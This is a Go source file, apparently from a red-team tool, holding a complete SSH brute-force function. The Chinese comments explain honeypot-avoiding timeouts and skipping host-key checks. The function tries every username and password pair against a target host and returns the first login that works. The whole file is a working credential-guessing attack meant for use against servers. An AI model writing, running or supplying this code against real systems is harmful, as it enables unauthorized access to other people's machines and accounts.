package service

import (
	"fmt"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

// SSHBruteForce 尝试爆破单个目标
// 返回: 成功拿到的 (user, password) 或者 error
func SSHBruteForce(host string, port int, users []string, passwords []string) (string, string, bool) {
	// 1. 设置超时，防止被蜜罐卡死
	// 如果 3秒 还没握手成功，直接下一个，不要浪费时间
	timeout := 3 * time.Second

	for _, user := range users {
		for _, pass := range passwords {
			// 2. 配置 SSH Client
			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(pass),
				},
				// 忽略 Host Key 检查 (红队扫描常规操作，不验证目标是否可信)
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         timeout,
			}

			// 3. 拼接地址
			target := fmt.Sprintf("%s:%d", host, port)

			// 4. 尝试连接 (Pure Go 的核心)
			// 这里没有调用任何系统命令，完全是 Go 的网络栈在跑
			conn, err := ssh.Dial("tcp", target, config)
			if err == nil {
				// 🎯 成功拿到 shell！
				conn.Close()
				return user, pass, true
			}

			// 💡 进阶技巧：区分“密码错误”和“网络不通”
			// 如果是网络不通，后续的密码就不用试了，直接跳出内层循环
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// 超时了，可能是 IP 不通
				return "", "", false
			}
		}
	}

	return "", "", false
}
